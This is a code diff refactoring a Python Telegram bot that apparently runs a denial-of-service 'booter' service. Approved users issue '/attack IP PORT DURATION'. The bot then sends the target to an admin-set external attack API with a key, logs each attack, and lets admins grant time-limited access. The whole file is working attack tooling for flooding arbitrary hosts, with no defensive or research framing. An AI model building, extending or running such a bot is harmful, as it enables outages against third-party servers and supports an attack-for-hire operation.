@@ -1,6 +1,7 @@
-import asyncio
 import logging
 import sys
+import re
+import uuid
 from datetime import datetime, timedelta, timezone
 from typing import Dict, Optional, List
 import requests
@@ -16,67 +17,47 @@ from telegram.ext import (
 )
 import pymongo
 from pymongo import MongoClient, ASCENDING, DESCENDING
-import re
-from functools import wraps
-import uuid
 import os
 from dotenv import load_dotenv
 
-# Configure logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+# Basic setup
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
-
 load_dotenv()
 
-# ---------- SAFE ADMIN_IDS PARSING ----------
-def parse_admin_ids(env_value: str, default: str = "8210011971") -> list:
-    if not env_value or env_value.strip() == "":
-        env_value = default
-    env_value = env_value.strip()
-    if (env_value.startswith('"') and env_value.endswith('"')) or (env_value.startswith("'") and env_value.endswith("'")):
-        env_value = env_value[1:-1]
-    ids = []
-    for part in env_value.split(","):
-        part = part.strip()
-        if part and part.isdigit():
-            ids.append(int(part))
-    if not ids:
-        ids = [int(default)] if default.isdigit() else [8210011971]
-    return ids
-
-# ---------- READ ENVIRONMENT VARIABLES ----------
+# ---------- CONFIG ----------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-ADMIN_IDS = parse_admin_ids(os.getenv("ADMIN_IDS", ""), "8210011971")
+ADMIN_IDS = []
+admin_env = os.getenv("ADMIN_IDS", "8210011971").strip()
+# Remove quotes
+if admin_env.startswith('"') and admin_env.endswith('"'):
+    admin_env = admin_env[1:-1]
+for part in admin_env.split(","):
+    part = part.strip()
+    if part.isdigit():
+        ADMIN_IDS.append(int(part))
+if not ADMIN_IDS:
+    ADMIN_IDS = [8210011971]
 
-missing = []
+# Check required
 if not BOT_TOKEN:
-    missing.append("BOT_TOKEN")
+    print("❌ BOT_TOKEN missing")
+    sys.exit(1)
 if not MONGODB_URI:
-    missing.append("MONGODB_URI")
-if missing:
-    print(f"❌ Missing env vars: {', '.join(missing)}")
+    print("❌ MONGODB_URI missing")
     sys.exit(1)
 
-# Blocked ports
-BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
-MIN_PORT = 1
-MAX_PORT = 65535
+BLOCKED_PORTS = {443, 8700, 9031, 17500, 20000, 20001, 20002}
+MIN_PORT, MAX_PORT = 1, 65535
+APPROVE_USER, APPROVE_DAYS = 1, 2
+DISAPPROVE_USER = 3
+SETAPI_URL, SETAPI_KEY = 4, 5
 
-# Conversation states
-APPROVE_USER, APPROVE_DAYS = range(2)
-DISAPPROVE_USER = 1
-SETAPI_URL, SETAPI_KEY = 10, 11
-
-# ---------- TIMEZONE HELPERS ----------
+# ---------- TIME HELPERS ----------
 def make_aware(dt):
-    if dt is None:
-        return None
-    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
+    if dt and dt.tzinfo is None:
         return dt.replace(tzinfo=timezone.utc)
     return dt
 
@@ -91,19 +72,17 @@ class Database:
         self.users = self.db.users
         self.attacks = self.db.attacks
         self.settings = self.db.settings
-        # Cleanup
-        try:
-            self.users.delete_many({"user_id": None})
-            self.users.delete_many({"user_id": {"$exists": False}})
-        except:
-            pass
+        # Clean null users
+        self.users.delete_many({"user_id": None})
+        self.users.delete_many({"user_id": {"$exists": False}})
+        # Indexes
         self.attacks.create_index([("timestamp", DESCENDING)])
         self.attacks.create_index([("user_id", ASCENDING)])
         self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
-        # Ensure settings doc
+        # Default settings
         if not self.settings.find_one({"_id": "api_config"}):
             self.settings.insert_one({"_id": "api_config", "api_url": "", "api_key": ""})
-        
+    
     def get_user(self, user_id: int):
         user = self.users.find_one({"user_id": user_id})
         if user:
@@ -113,141 +92,104 @@ class Database:
         return user
     
     def create_user(self, user_id: int, username: str = None):
-        existing = self.get_user(user_id)
-        if existing:
-            return existing
-        user_data = {
-            "user_id": user_id,
-            "username": username,
-            "approved": False,
-            "approved_at": None,
-            "expires_at": None,
-            "total_attacks": 0,
-            "created_at": get_current_time(),
-            "is_banned": False
-        }
-        try:
-            self.users.insert_one(user_data)
-        except pymongo.errors.DuplicateKeyError:
-            pass
-        return user_data
+        if self.get_user(user_id):
+            return
+        self.users.insert_one({
+            "user_id": user_id, "username": username, "approved": False,
+            "approved_at": None, "expires_at": None, "total_attacks": 0,
+            "created_at": get_current_time(), "is_banned": False
+        })
     
     def approve_user(self, user_id: int, days: int) -> bool:
-        expires_at = get_current_time() + timedelta(days=days)
-        res = self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
-        )
+        exp = get_current_time() + timedelta(days=days)
+        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": exp}})
         return res.modified_count > 0
     
     def disapprove_user(self, user_id: int) -> bool:
-        res = self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": False, "expires_at": None}}
-        )
+        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": False, "expires_at": None}})
         return res.modified_count > 0
     
-    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
-        attack_data = {
-            "_id": str(uuid.uuid4()),
-            "user_id": user_id,
-            "ip": ip,
-            "port": port,
-            "duration": duration,
-            "status": status,
-            "response": response[:500] if response else None,
-            "timestamp": get_current_time()
-        }
-        try:
-            self.attacks.insert_one(attack_data)
-            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
-        except Exception as e:
-            logger.error(f"Log error: {e}")
+    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = ""):
+        self.attacks.insert_one({"_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
+                                 "duration": duration, "status": status, "response": response[:500],
+                                 "timestamp": get_current_time()})
+        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
     
     def get_all_users(self):
-        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
+        users = list(self.users.find({"user_id": {"$ne": None}}))
         for u in users:
             for f in ["created_at","approved_at","expires_at"]:
-                if u.get(f):
-                    u[f] = make_aware(u[f])
-            if "total_attacks" not in u:
-                u["total_attacks"] = 0
+                if u.get(f): u[f] = make_aware(u[f])
+            if "total_attacks" not in u: u["total_attacks"] = 0
         return users
     
-    def get_user_attack_stats(self, user_id: int):
+    def get_user_stats(self, user_id: int):
         total = self.attacks.count_documents({"user_id": user_id})
         success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
         failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
         recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
         for a in recent:
-            if a.get("timestamp"):
-                a["timestamp"] = make_aware(a["timestamp"])
+            if a.get("timestamp"): a["timestamp"] = make_aware(a["timestamp"])
         return {"total": total, "successful": success, "failed": failed, "recent": recent}
     
     def get_api_config(self):
         doc = self.settings.find_one({"_id": "api_config"})
         return doc.get("api_url", ""), doc.get("api_key", "")
     
-    def set_api_config(self, api_url: str, api_key: str):
-        self.settings.update_one({"_id": "api_config"}, {"$set": {"api_url": api_url, "api_key": api_key}}, upsert=True)
+    def set_api_config(self, url: str, key: str):
+        self.settings.update_one({"_id": "api_config"}, {"$set": {"api_url": url, "api_key": key}}, upsert=True)
 
-print("🔄 Connecting to MongoDB...")
+print("📦 Connecting to MongoDB...")
 db = Database()
-print("✅ Database ready")
+print("✅ Ready")
 
-def is_port_blocked(port: int) -> bool:
-    return port in BLOCKED_PORTS
+def is_port_blocked(p): return p in BLOCKED_PORTS
+def blocked_ports_str(): return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
 
-def get_blocked_ports_list() -> str:
-    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
-
-async def is_user_approved(user_id: int) -> bool:
-    user = db.get_user(user_id)
-    if not user or not user.get("approved"):
-        return False
-    exp = user.get("expires_at")
-    if exp and make_aware(exp) < get_current_time():
-        return False
+async def is_approved(uid):
+    u = db.get_user(uid)
+    if not u or not u.get("approved"): return False
+    exp = u.get("expires_at")
+    if exp and make_aware(exp) < get_current_time(): return False
     return True
 
-# ---------- API FUNCTION WITH DETAILED ERROR ----------
-def launch_attack(ip: str, port: int, duration: int) -> Dict:
+# ---------- API CALL WITH FULL ERROR DETAILS ----------
+def send_attack(ip: str, port: int, duration: int):
     api_url, api_key = db.get_api_config()
     if not api_url:
-        return {"success": False, "error": "API URL not configured. Admin please use /setapi command or Admin Panel → Set API URL/Key."}
+        return False, "❌ API URL is not configured. Admin must use /setapi command or Admin Panel."
     if not api_key:
-        return {"success": False, "error": "API Key not configured. Admin please set API key."}
+        return False, "❌ API Key is missing. Admin must set it."
+    
+    # Ensure URL scheme
+    if not api_url.startswith(("http://", "https://")):
+        api_url = "https://" + api_url
+    
+    # Prepare request
+    params = {"ip": ip, "port": port, "duration": duration}
+    headers = {"x-api-key": api_key}
     try:
-        # Ensure scheme
-        if not api_url.startswith(("http://", "https://")):
-            api_url = "https://" + api_url
-        # Build URL with query parameters (common for simple attack APIs)
-        params = {"ip": ip, "port": port, "duration": duration}
-        headers = {"x-api-key": api_key}
         response = requests.get(api_url, params=params, headers=headers, timeout=15)
         if response.status_code == 200:
-            try:
-                return response.json()
-            except:
-                return {"success": True, "message": response.text[:200]}
+            return True, f"✅ Attack launched successfully! HTTP {response.status_code}"
         else:
-            return {"success": False, "error": f"HTTP {response.status_code}: {response.text[:100]}"}
+            return False, f"❌ API returned HTTP {response.status_code}: {response.text[:200]}"
     except requests.exceptions.NameResolutionError:
-        return {"success": False, "error": f"Domain not found: {api_url}. Check API URL (should be like https://example.com/api/attack)."}
+        return False, f"❌ Domain not resolved: {api_url}. Check the API URL."
     except requests.exceptions.ConnectionError as e:
-        return {"success": False, "error": f"Connection error: {str(e)[:100]}. Server may be down or wrong port."}
+        return False, f"❌ Connection error: {str(e)[:150]}"
     except requests.exceptions.Timeout:
-        return {"success": False, "error": "Request timeout (15s). API server too slow."}
+        return False, "❌ Request timeout (15s). API server may be slow or down."
     except Exception as e:
-        return {"success": False, "error": f"Unexpected error: {str(e)[:150]}"}
+        return False, f"❌ Unexpected error: {str(e)[:200]}"
 
 # ---------- KEYBOARDS ----------
-def main_menu_keyboard(is_admin: bool = False, is_approved: bool = False):
+def main_menu(is_admin: bool, approved: bool):
     keyboard = []
-    if is_approved:
+    if approved:
         keyboard.append([InlineKeyboardButton("🚀 Attack", callback_data="attack_menu")])
         keyboard.append([InlineKeyboardButton("📊 My Info", callback_data="myinfo"), InlineKeyboardButton("📈 My Stats", callback_data="mystats")])
-        keyboard.append([InlineKeyboardButton("🎯 My Attacks", callback_data="myattacks"), InlineKeyboardButton("🚫 Blocked Ports", callback_data="blockedports")])
+        keyboard.append([InlineKeyboardButton("🚫 Blocked Ports", callback_data="blockedports")])
         keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
     else:
         keyboard.append([InlineKeyboardButton("❌ Access Denied", callback_data="no_access")])
@@ -256,164 +198,151 @@ def main_menu_keyboard(is_admin: bool = False, is_approved: bool = False):
         keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
     return InlineKeyboardMarkup(keyboard)
 
-def admin_panel_keyboard():
-    keyboard = [
+def admin_panel_kb():
+    kb = [
         [InlineKeyboardButton("✅ Approve User", callback_data="admin_approve")],
         [InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove")],
         [InlineKeyboardButton("📋 List Users", callback_data="admin_users")],
         [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
         [InlineKeyboardButton("🔌 API Status", callback_data="admin_status")],
-        [InlineKeyboardButton("⚡ Running Attacks", callback_data="admin_running")],
-        [InlineKeyboardButton("🚫 Blocked Ports", callback_data="admin_blockedports")],
         [InlineKeyboardButton("🔧 Set API URL/Key", callback_data="admin_setapi")],
-        [InlineKeyboardButton("🔙 Back to Main", callback_data="back_main")]
+        [InlineKeyboardButton("🚫 Blocked Ports", callback_data="admin_blockedports")],
+        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
     ]
-    return InlineKeyboardMarkup(keyboard)
+    return InlineKeyboardMarkup(kb)
 
-def attack_menu_keyboard():
-    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main", callback_data="back_main")]])
+def attack_back_kb():
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]])
 
 # ---------- COMMAND HANDLERS ----------
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def start_cmd(update, context):
     uid = update.effective_user.id
-    username = update.effective_user.username
-    db.create_user(uid, username)
-    approved = await is_user_approved(uid)
+    name = update.effective_user.username
+    db.create_user(uid, name)
+    approved = await is_approved(uid)
     is_admin = uid in ADMIN_IDS
     if approved:
-        user = db.get_user(uid)
-        exp = user.get('expires_at')
-        days_left = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
-        text = f"✅ *Welcome back, {username or uid}!*\n\nYour account is active for *{days_left}* days.\n\nChoose an option:"
+        exp = db.get_user(uid).get("expires_at")
+        days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
+        text = f"✅ *Welcome {name or uid}!* Account active for {days} days.\nChoose option:"
     else:
-        text = f"❌ *Access Denied, {username or uid}!*\n\nYour account is not approved.\nContact administrator."
-    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
+        text = f"❌ *Access Denied, {name or uid}!* Not approved. Contact admin."
+    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_handler(update, context):
     query = update.callback_query
     await query.answer()
     data = query.data
     uid = query.from_user.id
     is_admin = uid in ADMIN_IDS
-    approved = await is_user_approved(uid)
+    approved = await is_approved(uid)
     
     if data == "attack_menu":
         if not approved:
-            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
+            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
             return
         await query.edit_message_text(
-            "🚀 *Launch Attack*\n\nSend command:\n`/attack <IP> <PORT> <DURATION>`\n\nExample:\n`/attack 192.168.1.1 80 60`\n\nBlocked ports: " + get_blocked_ports_list(),
-            parse_mode="Markdown",
-            reply_markup=attack_menu_keyboard()
+            f"🚀 *Launch Attack*\nSend: `/attack IP PORT DURATION`\nExample: `/attack 1.2.3.4 80 60`\n\nBlocked ports: {blocked_ports_str()}",
+            parse_mode="Markdown", reply_markup=attack_back_kb()
         )
     elif data == "myinfo":
         if not approved:
-            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
+            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
             return
-        user = db.get_user(uid)
-        if user.get("approved"):
-            exp = user.get("expires_at")
-            if exp:
-                days = max(0, (make_aware(exp) - get_current_time()).days)
-                hours = max(0, (make_aware(exp) - get_current_time()).seconds // 3600)
-                expiry = f"{days}d {hours}h"
-            else:
-                expiry = "Never"
-            text = f"📋 *Your Account Info*\n\n🆔 User ID: `{uid}`\n✅ Status: Approved\n⏰ Expires: {expiry}\n🎯 Total Attacks: {user.get('total_attacks',0)}"
+        u = db.get_user(uid)
+        if u.get("approved"):
+            exp = u.get("expires_at")
+            days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
+            txt = f"📋 *Your Info*\n🆔 `{uid}`\n✅ Approved\n⏰ Expires in {days} days\n🎯 Total attacks: {u.get('total_attacks',0)}"
         else:
-            text = f"❌ Not approved. Contact admin."
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
+            txt = "❌ Not approved."
+        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
     elif data == "mystats":
         if not approved:
-            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
+            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
             return
-        stats = db.get_user_attack_stats(uid)
-        rate = (stats['successful']/stats['total']*100) if stats['total']>0 else 0
-        text = f"📊 *Your Attack Stats*\n\n🎯 Total: `{stats['total']}`\n✅ Successful: `{stats['successful']}`\n❌ Failed: `{stats['failed']}`\n📈 Success Rate: `{rate:.1f}%`"
-        if stats['recent']:
-            text += "\n\n🕐 *Recent Attacks:*\n"
-            for a in stats['recent'][:3]:
+        s = db.get_user_stats(uid)
+        rate = (s['successful']/s['total']*100) if s['total']>0 else 0
+        txt = f"📊 *Your Stats*\nTotal: {s['total']}\n✅ {s['successful']} | ❌ {s['failed']}\nSuccess: {rate:.1f}%"
+        if s['recent']:
+            txt += "\n\n*Recent:*\n"
+            for a in s['recent'][:3]:
                 ago = (get_current_time() - a['timestamp']).seconds // 60
-                icon = "✅" if a['status']=="success" else "❌"
-                text += f"{icon} `{a['ip']}:{a['port']}` - {a['duration']}s ({ago}m ago)\n"
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
-    elif data == "myattacks":
-        if not approved:
-            await query.edit_message_text("❌ Not approved.", reply_markup=main_menu_keyboard(is_admin, False))
-            return
-        # dummy check running attacks
-        await query.edit_message_text("✅ No active attacks (API integration limited).", reply_markup=main_menu_keyboard(is_admin, approved))
+                txt += f"{'✅' if a['status']=='success' else '❌'} `{a['ip']}:{a['port']}` - {a['duration']}s ({ago}m ago)\n"
+        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
     elif data == "blockedports":
-        text = f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}\n\n✅ *Allowed:* 1-65535 except those."
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
+        txt = f"🚫 *Blocked ports*\n{blocked_ports_str()}\nAllowed: 1-65535 except these."
+        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
     elif data == "help":
-        text = "🤖 *Commands*\nUse buttons or:\n/attack - Launch attack\n/myinfo - Account info\n/mystats - Statistics\n/blockedports - Blocked ports\n/help - This help"
+        txt = "🤖 *Bot Help*\nUse buttons or commands:\n/attack, /myinfo, /mystats, /blockedports"
         if is_admin:
-            text += "\n\n👑 *Admin:*\nUse Admin Panel to approve/disapprove users, set API URL/key."
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
+            txt += "\n\n👑 Admin commands via Admin Panel."
+        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
     elif data == "admin_panel":
         if not is_admin:
-            await query.edit_message_text("❌ Unauthorized.", reply_markup=main_menu_keyboard(is_admin, approved))
+            await query.edit_message_text("Unauthorized.", reply_markup=main_menu(is_admin, approved))
             return
-        api_url, api_key = db.get_api_config()
-        url_display = api_url if api_url else "Not set"
-        key_display = (api_key[:10] + "...") if api_key else "Not set"
+        url, key = db.get_api_config()
+        url_disp = url if url else "Not set"
+        key_disp = (key[:10]+"...") if key else "Not set"
         await query.edit_message_text(
-            f"👑 *Admin Panel*\n\n🔗 API URL: `{url_display}`\n🔑 API Key: `{key_display}`\n\nSelect action:",
-            parse_mode="Markdown",
-            reply_markup=admin_panel_keyboard()
+            f"👑 *Admin Panel*\n🔗 API URL: `{url_disp}`\n🔑 API Key: `{key_disp}`\n\nChoose action:",
+            parse_mode="Markdown", reply_markup=admin_panel_kb()
         )
     elif data == "back_main":
-        await query.edit_message_text("Main Menu:", parse_mode="Markdown", reply_markup=main_menu_keyboard(is_admin, approved))
+        await query.edit_message_text("Main menu:", parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
     elif data == "admin_users":
         if not is_admin: return
         users = db.get_all_users()
         if not users:
-            text = "No users."
+            txt = "No users."
         else:
             approved_cnt = sum(1 for u in users if u.get("approved"))
-            text = f"👥 Total: {len(users)} | ✅ Approved: {approved_cnt}\n\n"
+            txt = f"👥 Total: {len(users)} | ✅ Approved: {approved_cnt}\n\n"
             for u in users[:15]:
-                status = "✅" if u.get('approved') else "⏳"
-                text += f"{status} `{u['user_id']}` - {u.get('total_attacks',0)} attacks\n"
+                txt += f"{'✅' if u.get('approved') else '⏳'} `{u['user_id']}` - {u.get('total_attacks',0)} attacks\n"
             if len(users) > 15:
-                text += f"\n+ {len(users)-15} more"
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
+                txt += f"\n+ {len(users)-15} more"
+        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=admin_panel_kb())
     elif data == "admin_stats":
         if not is_admin: return
         users = db.get_all_users()
         total_atk = sum(u.get('total_attacks',0) for u in users)
-        text = f"📊 *Bot Stats*\n👥 Users: {len(users)}\n🎯 Total attacks: {total_atk}\n🚫 Blocked ports: {len(BLOCKED_PORTS)}"
-        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
+        txt = f"📊 *Bot Stats*\n👥 Users: {len(users)}\n🎯 Total attacks: {total_atk}\n🚫 Blocked ports: {len(BLOCKED_PORTS)}"
+        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=admin_panel_kb())
     elif data == "admin_status":
         if not is_admin: return
-        api_url, api_key = db.get_api_config()
-        if not api_url:
-            await query.edit_message_text("❌ API URL not set. Use Set API URL/Key button.", reply_markup=admin_panel_keyboard())
+        url, key = db.get_api_config()
+        if not url:
+            await query.edit_message_text("API URL not set. Use 'Set API URL/Key'.", reply_markup=admin_panel_kb())
             return
-        await query.edit_message_text("🔄 Checking API...")
+        await query.edit_message_text("🔍 Testing API connection...")
         try:
-            if not api_url.startswith(("http://","https://")):
-                api_url = "https://" + api_url
-            resp = requests.get(api_url, headers={"x-api-key": api_key}, timeout=10)
-            status_text = f"✅ API responded with HTTP {resp.status_code}"
+            test_url = url if url.startswith(("http://","https://")) else "https://"+url
+            resp = requests.get(test_url, headers={"x-api-key": key}, timeout=10)
+            status = f"✅ API responded with HTTP {resp.status_code}"
         except Exception as e:
-            status_text = f"❌ API error: {str(e)[:150]}"
-        await query.edit_message_text(status_text, parse_mode="Markdown", reply_markup=admin_panel_keyboard())
-    elif data == "admin_running":
-        if not is_admin: return
-        await query.edit_message_text("ℹ️ Running attacks info not implemented for this API.", reply_markup=admin_panel_keyboard())
+            status = f"❌ Error: {str(e)[:150]}"
+        await query.edit_message_text(status, parse_mode="Markdown", reply_markup=admin_panel_kb())
     elif data == "admin_blockedports":
         if not is_admin: return
-        await query.edit_message_text(f"🚫 Blocked ports: {get_blocked_ports_list()}", reply_markup=admin_panel_keyboard())
+        await query.edit_message_text(f"🚫 Blocked ports: {blocked_ports_str()}", reply_markup=admin_panel_kb())
     elif data == "admin_setapi":
         if not is_admin: return
-        await query.edit_message_text("🔧 *Set API URL*\nSend the full API endpoint URL (must start with http:// or https://).\nExample: `https://yourdomain.com/api/attack`\n\nSend /cancel to abort.", parse_mode="Markdown")
+        await query.edit_message_text("🔧 *Set API URL*\nSend the full endpoint URL (must start with http:// or https://)\nExample: `https://yourdomain.com/api/attack`\nSend /cancel to abort.", parse_mode="Markdown")
         return SETAPI_URL
+    elif data == "admin_approve":
+        if not is_admin: return
+        await query.edit_message_text("📝 Send the user ID (number):")
+        return APPROVE_USER
+    elif data == "admin_disapprove":
+        if not is_admin: return
+        await query.edit_message_text("❌ Send user ID to disapprove:")
+        return DISAPPROVE_USER
     return ConversationHandler.END
 
-# Conversation: set API URL & Key
-async def setapi_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# Conversation: Set API
+async def setapi_url(update, context):
     url = update.message.text.strip()
     if not url.startswith(("http://","https://")):
         url = "https://" + url
@@ -421,44 +350,39 @@ async def setapi_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Now send the API Key (or /cancel):")
     return SETAPI_KEY
 
-async def setapi_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def setapi_key(update, context):
     key = update.message.text.strip()
     url = context.user_data.get('api_url')
     if url and key:
         db.set_api_config(url, key)
         await update.message.reply_text(f"✅ API configured!\nURL: `{url}`\nKey: `{key[:10]}...`", parse_mode="Markdown")
     else:
-        await update.message.reply_text("❌ Invalid input.")
+        await update.message.reply_text("❌ Invalid. Cancelled.")
     context.user_data.clear()
     # Back to admin panel
     uid = update.effective_user.id
     is_admin = uid in ADMIN_IDS
-    approved = await is_user_approved(uid)
-    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
+    approved = await is_approved(uid)
+    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_kb())
     return ConversationHandler.END
 
-async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data.clear()
-    await update.message.reply_text("Operation cancelled.")
-    return ConversationHandler.END
-
-# Approve conversation
-async def approve_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid_str = update.message.text.strip()
-    if not uid_str.isdigit():
-        await update.message.reply_text("❌ Invalid user ID. Use /cancel.")
+# Conversation: Approve
+async def approve_uid(update, context):
+    txt = update.message.text.strip()
+    if not txt.isdigit():
+        await update.message.reply_text("Invalid user ID. Send /cancel")
         return APPROVE_USER
-    context.user_data['approve_uid'] = int(uid_str)
+    context.user_data['approve_uid'] = int(txt)
     await update.message.reply_text("Enter number of days:")
     return APPROVE_DAYS
 
-async def approve_user_days(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    days_str = update.message.text.strip()
-    if not days_str.isdigit():
-        await update.message.reply_text("❌ Invalid days. Use /cancel.")
+async def approve_days(update, context):
+    days = update.message.text.strip()
+    if not days.isdigit():
+        await update.message.reply_text("Invalid days. /cancel")
         return APPROVE_DAYS
     uid = context.user_data.get('approve_uid')
-    days = int(days_str)
+    days = int(days)
     if db.approve_user(uid, days):
         await update.message.reply_text(f"✅ User `{uid}` approved for {days} days.", parse_mode="Markdown")
         try:
@@ -468,15 +392,16 @@ async def approve_user_days(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ Approval failed.")
     context.user_data.clear()
-    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
+    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_kb())
     return ConversationHandler.END
 
-async def disapprove_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid_str = update.message.text.strip()
-    if not uid_str.isdigit():
-        await update.message.reply_text("❌ Invalid user ID. Use /cancel.")
+# Conversation: Disapprove
+async def disapprove_uid(update, context):
+    txt = update.message.text.strip()
+    if not txt.isdigit():
+        await update.message.reply_text("Invalid. /cancel")
         return DISAPPROVE_USER
-    uid = int(uid_str)
+    uid = int(txt)
     if db.disapprove_user(uid):
         await update.message.reply_text(f"✅ User `{uid}` disapproved.", parse_mode="Markdown")
         try:
@@ -486,20 +411,23 @@ async def disapprove_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE)
     else:
         await update.message.reply_text("❌ Failed.")
     context.user_data.clear()
-    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_keyboard())
+    await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_kb())
     return ConversationHandler.END
 
-# Attack command with detailed error reporting
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cancel_conv(update, context):
+    context.user_data.clear()
+    await update.message.reply_text("Cancelled.")
+    return ConversationHandler.END
+
+# ---------- ATTACK COMMAND WITH DIRECT ERROR HANDLING ----------
+async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if not await is_user_approved(uid):
-        await update.message.reply_text("❌ Not approved. Contact admin.")
+    if not await is_approved(uid):
+        await update.message.reply_text("❌ Your account is not approved or expired. Contact admin.")
         return
     args = context.args
     if len(args) != 3:
-        await update.message.reply_text(
-            f"❌ Usage: /attack IP PORT DURATION\nExample: /attack 1.2.3.4 80 60\n\nBlocked ports: {get_blocked_ports_list()}"
-        )
+        await update.message.reply_text(f"❌ Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 1.2.3.4 80 60\n\nBlocked ports: {blocked_ports_str()}")
         return
     ip, port_str, dur_str = args
     if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
@@ -513,112 +441,98 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if duration < 1 or duration > 300:
             raise ValueError
     except:
-        await update.message.reply_text(f"❌ Invalid port (1-65535, not blocked) or duration (1-300s).")
+        await update.message.reply_text("❌ Invalid port (1-65535, not blocked) or duration (1-300s).")
         return
+    
+    status_msg = await update.message.reply_text(f"🚀 Launching attack on `{ip}:{port}` for {duration}s...", parse_mode="Markdown")
+    success, message = send_attack(ip, port, duration)
+    db.log_attack(uid, ip, port, duration, "success" if success else "failed", message)
+    await status_msg.edit_text(message, parse_mode="Markdown")
 
-    msg = await update.message.reply_text(f"🚀 Launching attack on `{ip}:{port}` for {duration}s...", parse_mode="Markdown")
-    resp = launch_attack(ip, port, duration)
-    if resp.get("success"):
-        await msg.edit_text(f"✅ Attack launched!\nTarget: `{ip}:{port}`\nDuration: {duration}s\nResponse: {resp.get('message','')[:100]}", parse_mode="Markdown")
-        db.log_attack(uid, ip, port, duration, "success", str(resp))
-    else:
-        error = resp.get("error", "Unknown error")
-        await msg.edit_text(f"❌ Attack failed:\n{error}", parse_mode="Markdown")
-        db.log_attack(uid, ip, port, duration, "failed", str(resp))
-
-# Other user commands (simple)
